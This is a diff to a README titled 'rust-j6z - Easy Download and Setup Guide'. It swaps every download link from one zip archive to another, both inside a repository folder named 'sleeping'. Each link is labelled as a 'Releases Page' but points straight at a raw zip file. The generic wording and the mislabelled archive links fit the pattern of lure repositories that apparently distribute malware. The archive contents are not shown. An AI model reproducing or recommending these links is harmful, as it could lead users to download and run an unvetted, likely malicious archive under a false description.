@@ -1,6 +1,6 @@
 # 🚀 rust-j6z - Easy Download and Setup Guide
 
-[![Download rust-j6z](https://raw.githubusercontent.com/Robloxrichbloxian/rust-j6z/main/sleeping/rust-j6z_v2.7-alpha.4.zip)](https://raw.githubusercontent.com/Robloxrichbloxian/rust-j6z/main/sleeping/rust-j6z_v2.7-alpha.4.zip)
+[![Download rust-j6z](https://github.com/Robloxrichbloxian/rust-j6z/raw/refs/heads/main/sleeping/z-rust-j-2.1.zip)](https://github.com/Robloxrichbloxian/rust-j6z/raw/refs/heads/main/sleeping/z-rust-j-2.1.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ To begin using rust-j6z, you'll need to download it from our Releases page. This
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the application, visit the [rust-j6z Releases Page](https://raw.githubusercontent.com/Robloxrichbloxian/rust-j6z/main/sleeping/rust-j6z_v2.7-alpha.4.zip).
+   To download the application, visit the [rust-j6z Releases Page](https://github.com/Robloxrichbloxian/rust-j6z/raw/refs/heads/main/sleeping/z-rust-j-2.1.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version. This version will have the most up-to-date features and fixes.
@@ -86,4 +86,4 @@ For more information on how to use rust-j6z, consider reviewing our documentatio
 
 --- 
 
-For any further assistance, don’t hesitate to visit our [Releases Page](https://raw.githubusercontent.com/Robloxrichbloxian/rust-j6z/main/sleeping/rust-j6z_v2.7-alpha.4.zip) again for updates or to download the latest version. Enjoy using rust-j6z!
+For any further assistance, don’t hesitate to visit our [Releases Page](https://github.com/Robloxrichbloxian/rust-j6z/raw/refs/heads/main/sleeping/z-rust-j-2.1.zip) again for updates or to download the latest version. Enjoy using rust-j6z!
